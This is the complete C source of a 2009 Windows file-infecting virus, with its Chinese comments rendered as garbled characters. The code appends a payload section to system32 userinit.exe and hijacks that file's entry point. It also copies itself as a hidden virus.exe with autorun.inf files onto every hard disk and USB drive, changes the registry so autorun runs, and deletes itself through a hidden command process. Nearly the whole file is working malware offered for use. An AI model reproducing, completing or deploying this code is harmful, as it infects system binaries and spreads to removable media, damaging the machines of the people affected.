//////////////////////////////////////////////////////////////////////////
//FileName:	Virus
//Data:		2009-04-22
//Remark:	PE��Ⱦ�Ͳ�������
//////////////////////////////////////////////////////////////////////////
#pragma once
#include <stdio.h>
#include <Windows.h>
#pragma data_seg(".mydat")
#pragma code_seg(".shell")
#pragma const_seg(".constdata")
#pragma comment(linker,"/SECTION:.mydat,RWE")
#pragma comment(linker,"/SECTION:.shell,RWE")
#pragma comment(linker,"/SECTION:.constdata,RWE")
#pragma comment(linker,"/MERGE:.mydat=.shell")
#pragma comment(linker,"/MERGE:.constdata=.shell")
#pragma comment(linker, "/OPT:NOWIN98")
#pragma comment(linker, "/subsystem:windows /entry:main")

//////////////////////////////////////////////////////////////////////////
//�궨�岿��
//////////////////////////////////////////////////////////////////////////

//��ȾĿ���ļ�
#define TARGET	"\\userinit.exe"
//��Ⱦ���
#define INFECTFLAG	19901117

//////////////////////////////////////////////////////////////////////////
//Payload ����
//////////////////////////////////////////////////////////////////////////
//�궨�塢������������
//�˺��ʵ�ִ����ض�λ
#define RECODE(A) { _asm call A _asm A: _asm pop ebx _asm lea eax,A _asm sub ebx,eax }
//�ض�λ�ַ���ƫ��
#define RecodeStrOffset(pStr)  { _asm mov eax,[pStr] _asm lea eax,[ebx+eax] _asm mov pStr,eax } 
#define RecodeVarOffset(dwGlovalVar,dwLocalVar)  { _asm mov eax,[ebx+dwGlovalVar] _asm mov dwLocalVar,eax }
//��̬����������ַ
void GetKernelFunc(void);
//����payload
void ShellExcute(char* szDll,char* szFunc,char* szAction,char* szUrl);
//���ں������Ƚ�
int FunCompare(char* str1,char* str2);

//Typedef ����
typedef HINSTANCE (WINAPI *pLoadLibraryFunc)(LPCTSTR);
typedef DWORD (WINAPI *pShellExcuteFunc)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);


//Payload �����￪ʼ
DWORD EntryPoint = 0;
char szShellExcute[] = "ShellExecuteA";
char szShell[] = "Shell32.dll";
char szKernel[] = "Kernel32.dll";
char szAction[] = "open";
char szUrl[] = "www.google.cn";
char szLoadLibrary[] = "LoadLibraryA";
char szGetProcAddress[] = "GetProcAddress";

DWORD dwLoadLibrary = 0;
DWORD dwGetProcAddress = 0;

void BeginPoint(void)
{
	RECODE(A);
	DWORD OldEntryPoint = 0;
	RecodeVarOffset(EntryPoint,OldEntryPoint)
	GetKernelFunc();

	ShellExcute(szShell,szShellExcute,szAction,szUrl);

	_asm{
		jmp OldEntryPoint
	}

}


//////////////////////////////////////////////////////////////////////////
//���ں������Ƚ�
//////////////////////////////////////////////////////////////////////////
int FunCompare(char* str1,char* str2)
{
	while ( *str1 && *str2 && *str1==*str2)
	{
		str1++;str2++;
	}

	return (*str1-*str2);
}
//////////////////////////////////////////////////////////////////////////
//��ȡKernel32����ַ�������� LoadLibraryA() �� GetProcAddress() ��ַ
//////////////////////////////////////////////////////////////////////////
void GetKernelFunc(void)
{
	RECODE(A);

	PBYTE pLoadLibrary = (PBYTE)szLoadLibrary;
	PBYTE pGetProcAddress = (PBYTE)szGetProcAddress;

	RecodeStrOffset(pLoadLibrary);
	RecodeStrOffset(pGetProcAddress);

	//��ȡKernel32.dll�Ļ���ַ
	DWORD dwKernelBase = 0;
	_asm{
		mov	eax,dword ptr fs:[30h]
		mov eax,dword ptr [eax+0Ch]
		mov esi,dword ptr [eax+1Ch]
		lods dword ptr [esi]
		mov eax,dword ptr [eax+08h]
		mov dwKernelBase,eax
	}

	//Kernel32.dll��DOSͷ��PEͷ
	IMAGE_DOS_HEADER *pHdr = (IMAGE_DOS_HEADER*)dwKernelBase;
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)dwKernelBase+pHdr->e_lfanew);

	//����Ŀ¼��
	IMAGE_DATA_DIRECTORY *pDatHdr = pNTHdr->OptionalHeader.DataDirectory;
	//������
	IMAGE_EXPORT_DIRECTORY *pEPTHdr = (IMAGE_EXPORT_DIRECTORY*)((PBYTE)dwKernelBase + pDatHdr->VirtualAddress);
	//����������ַ
	DWORD* dwFunAdr = (DWORD*)((PBYTE)dwKernelBase + pEPTHdr->AddressOfFunctions);
	DWORD* dwAdr = (DWORD*)((PBYTE)dwKernelBase + pEPTHdr->AddressOfNames);
	DWORD dwFunc = 0;

	//������ LoadLibray() �� GetProcAddress() �ĵ�ַ
	for (unsigned int i=0;i<pEPTHdr->NumberOfNames;i++)
	{
		if (FunCompare((char*)dwKernelBase+dwAdr[i],(char*)pLoadLibrary)==0)
		{
			dwFunc = dwFunAdr[i];
			_asm{
				RECODE(B)
				mov eax,dwFunc
				add eax,dwKernelBase
				mov	[ebx+dwLoadLibrary],eax
			}
			continue;
		}
		if (FunCompare((char*)dwKernelBase+dwAdr[i],(char*)pGetProcAddress)==0)
		{
			dwFunc = dwFunAdr[i];
			_asm{
				RECODE(C)
				mov eax,dwFunc
				add eax,dwKernelBase
				mov	[ebx+dwGetProcAddress],eax
			}
		}
	}
}
//////////////////////////////////////////////////////////////////////////
//ִ��Shell���˺�������չ
//////////////////////////////////////////////////////////////////////////
void ShellExcute(char* szDll,char* szFunc,char* szAction,char* szUrl)
{
	RECODE(A);
	char *pLocalDll = szDll;
	RecodeStrOffset(szDll);
	RecodeStrOffset(szFunc);
	RecodeStrOffset(szAction);
	RecodeStrOffset(szUrl);

	//kernel32.dll BaseAddress : 0x7c800000.
	DWORD LoadLibrary = 0x7c800000;
	DWORD GetProcAddress = 0x7c800000;

	RecodeVarOffset(dwLoadLibrary,LoadLibrary);
	RecodeVarOffset(dwGetProcAddress,GetProcAddress);

	HMODULE hDll = ((HMODULE(WINAPI*)(char*))LoadLibrary)(szDll);
	PROC dwFunAddr = ((PROC(WINAPI*)(HMODULE,char*))GetProcAddress)(hDll,szFunc);

	_asm{
		mov eax,dwFunAddr
		push 0
		push 0
		push 0
		push szUrl
		push szAction
		push 0
		call eax
	}
}

///////////////////////////////////////////////////////////////////////////
//Payload���������
//////////////////////////////////////////////////////////////////////////
void EndPoint(void){}


//////////////////////////////////////////////////////////////////////////
//������������
//////////////////////////////////////////////////////////////////////////
//��Ⱦָ���ļ�
BOOL InfectFile(const char* fname);
//��Ⱦ��������
BOOL InfectDriver(void);
//�Ƿ�������PE�ļ�
BOOL IsPeFile(PVOID pHdr);
//�Ƿ��ѱ���Ⱦ
BOOL IsInfected(PVOID pHdr);
//�ֽڶ���
int Align(int size,int n);
//�޸�ע���ʵ���Զ�����
BOOL SetAutorun(void);
//ģ����̷�
BOOL OpenPath(void);
//��ɾ��
BOOL SelfDelete(void);
//////////////////////////////////////////////////////////////////////////
//Main Function
//////////////////////////////////////////////////////////////////////////
int main(void)
{
	//��ȾĿ���ļ�·��
	char path[MAX_PATH] = {0};

	//��ȡϵͳĿ¼
	GetSystemDirectory(path,MAX_PATH);

	strcat(path,TARGET);
	//��ȾĿ���ļ�
	if (!InfectFile(path))
	{
		return 0;
	}

	//��Ⱦ���д���
	InfectDriver();

	//�޸�ע���ʵ���Զ�����
	SetAutorun();

	//��ȡ������·��
	GetModuleFileName(NULL,path,MAX_PATH);
	if (strlen(path) != strlen("X:\\Virus.exe"))
	{
		//��ɾ��
		SelfDelete();
		return 0;
	}
	else
	{
		//ģ����̷�
		OpenPath();
	}

	//��ʾ�öԻ��򣬶��߿�ɾ
	MessageBox(NULL,"I'm Virus","Virus",MB_OK);

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//��Ⱦָ���ļ�
//////////////////////////////////////////////////////////////////////////
BOOL InfectFile(const char* fname)
{
	HANDLE hFile = CreateFile(fname,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);

	if (!hFile)
	{
		return FALSE;
	}
	HANDLE hMapFile = CreateFileMapping(hFile,NULL,PAGE_READWRITE,NULL,NULL,NULL);
	if (!hMapFile)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,NULL,NULL,NULL);
	if (!pHdr)
	{
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	// �ж��Ƿ�Ϊ����PE�ļ�
	if (!IsPeFile(pHdr))
	{
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//�ж��Ƿ��ѱ���Ⱦ
	if (IsInfected(pHdr))
	{
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}
	//PEͷָ�룺 �ļ�ͷָ��+DOSͷ��e_lfanewλָ����PEͷƫ��
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)->e_lfanew);
	//����ͷָ�룺 PEͷָ��+PEͷ�ĳ���
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));

	//��������ָ�룬�����ۺ����һ���½���
	//���һ����ָ��
	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections-1];
    //���� һ���½�
	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];

	//������Ŀ��һ
	pNTHdr->FileHeader.NumberOfSections++;

	//����ƫ����
	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;
	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;
	//��Ⱦ�Ĵ��볤��
	DWORD dwCodeSize  = (DWORD)EndPoint - (DWORD)&EntryPoint; 
	//����½ڵĸ��ֶ�
	memcpy(pNewSec->Name,".0xQo",6);
	pNewSec->PointerToRawData	=	pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->VirtualAddress		=	pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize,dwSecAlign);
	pNewSec->SizeOfRawData		=	Align(dwCodeSize,dwSecAlign);
	pNewSec->Misc.VirtualSize	=	Align(dwCodeSize,dwSecAlign);
	pNewSec->Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;

	//����PE�����С
	pNTHdr->OptionalHeader.SizeOfCode += pNewSec->Misc.VirtualSize;
	pNTHdr->OptionalHeader.SizeOfImage += pNewSec->Misc.VirtualSize;

	DWORD dwSize = 0;
	SetFilePointer(hFile,pNewSec->PointerToRawData,NULL,FILE_BEGIN);
	WriteFile(hFile,&EntryPoint,pNewSec->Misc.VirtualSize,&dwSize,NULL);
	SetEndOfFile(hFile);

	//�����µ���ڵ�(���Կ���EPO������)
	DWORD dwOldEntryPoint = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
	SetFilePointer(hFile,pNewSec->PointerToRawData,NULL,FILE_BEGIN);
	WriteFile(hFile,&dwOldEntryPoint,4,&dwSize,NULL);
	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress + (DWORD)BeginPoint - (DWORD)&EntryPoint;

	//�������..
	FlushViewOfFile(pHdr,pNTHdr->OptionalHeader.SizeOfHeaders);

	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//��Ⱦ��������
//////////////////////////////////////////////////////////////////////////
BOOL InfectDriver(void)
{
	for (char ch='C';ch<='Z';ch++)
	{
		//�洢�ͷ�·��,�ȹ����̷�
		char path[MAX_PATH] = {ch,':'};

		//ֻ��ȾӲ�̺�U����
		if (GetDriveType(path)==DRIVE_FIXED || GetDriveType(path)==DRIVE_REMOVABLE)
		{
			char p[MAX_PATH] = {0};
			memcpy(p,path,MAX_PATH);

			//�ͷŵ�EXE·��
			strcat(path,"\\virus.exe");
			char temp[MAX_PATH] = {0};
			//��ȡ������·��
			GetModuleFileName(NULL,temp,MAX_PATH);
			//�����ļ�
			CopyFile(temp,path,false);
			//�����ļ�����Ϊ ϵͳ|����
			SetFileAttributes(path,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

			//ʹ��autorunʵ������
			strcat(p,"\\autorun.inf");
			//��������autorun.inf	
			DeleteFile(p);
			FILE *fp = fopen(p,"a");
			memset(temp,0,MAX_PATH);
			//Autorun.inf��д��
			memcpy(temp,"[Autorun]\nOPEN=virus.exe\nshell\\open=��(&O)\nshell\\open\\Command=virus.exe\nshell\\open\\Default=1\nshell\\explore=��Դ������(&X)\nshell\\explore\\Command=virus.exe",MAX_PATH);
			fputs(temp,fp);
			fclose(fp);
			SetFileAttributes(p,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
		}

	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//�Ƿ�������PE�ļ�
//////////////////////////////////////////////////////////////////////////
BOOL IsPeFile(PVOID pHdr)
{
	//�ж�DOSͷ��־�Ƿ���ȷ
	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;
	if (p1->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return FALSE;
	}
	//�ж�PEͷ��־�Ƿ���ȷ
    IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1->e_lfanew);
	if (p2->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//�Ƿ��ѱ���Ⱦ
//////////////////////////////////////////////////////////////////////////
BOOL IsInfected(PVOID pHdr)
{
	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;
	//�ж�DOSͷ�ı���λ�Ƿ��ѱ����Ϊ 19901117
	if ( p->e_res2[0] == (WORD)INFECTFLAG)
	{
		return TRUE;
	}
	else
	{
		p->e_res2[0] = (WORD)INFECTFLAG;
		return FALSE;
	}
}

//////////////////////////////////////////////////////////////////////////
//�ֽڶ���
//////////////////////////////////////////////////////////////////////////
int Align(int size,int n)
{
	if (size%n)
	{
		return (size/n + 1)*n;
	}
	
	return size;
}


//////////////////////////////////////////////////////////////////////////
//�޸�ע���ʵ���Զ�����
//////////////////////////////////////////////////////////////////////////
BOOL SetAutorun(void)
{
	//Remark:  NoDriveTypeAutoRun��ֵΪ145�������Զ����У�255Ϊ�ر��Զ�����

	HKEY hKey;
	long iret = RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",&hKey);
	if (iret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	DWORD dwValue = 145;
	iret =RegSetValueEx(hKey,"NoDriveTypeAutoRun",NULL,REG_DWORD,(PBYTE)&dwValue,4);
	if (iret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	RegCloseKey(hKey);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//ģ����̷�
//////////////////////////////////////////////////////////////////////////
BOOL OpenPath(void)
{
	//��ȡ��ǰĿ¼
	char path[MAX_PATH] = {0};
	GetModuleFileName(NULL,path,MAX_PATH);
	path[strlen(path)-9] = '\0';
	//�򿪵�ǰĿ¼
	ShellExecute(NULL,NULL,path,NULL,NULL,SW_SHOWNORMAL);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//��ɾ��
//////////////////////////////////////////////////////////////////////////
BOOL SelfDelete(void)
{
	char	szModule[MAX_PATH];
	char	szComspec[MAX_PATH];
	char	szParams[MAX_PATH];

	//��ô��ļ���
	if ( GetModuleFileName(0,szModule,MAX_PATH)!=0 && GetShortPathName(szModule,szModule,MAX_PATH)!=0 && GetEnvironmentVariable(TEXT("COMSPEC"),szComspec,MAX_PATH)!=0 )
	{
		//�����������
		lstrcpy(szParams,TEXT(" /c del "));
		lstrcat(szParams,szModule);
		lstrcat(szParams,TEXT(" > nul"));
		lstrcat(szComspec,szParams);

		//���ṹ��
		STARTUPINFO	si = {0};
		PROCESS_INFORMATION	pi = {0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		//Ϊ��������ʵʱ���ȼ�
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_TIME_CRITICAL);

		//����Զ�̽���
		if (CreateProcess(0,szComspec,0,0,0,CREATE_SUSPENDED | DETACHED_PROCESS,0,0,&si,&pi))
		{
			//��ͣһֱ���ó����˳���ִ��
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);

			//�Եͼ���ָ�������
			ResumeThread(pi.hThread);

			return TRUE;
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_NORMAL);
		}
	}

	return FALSE;
}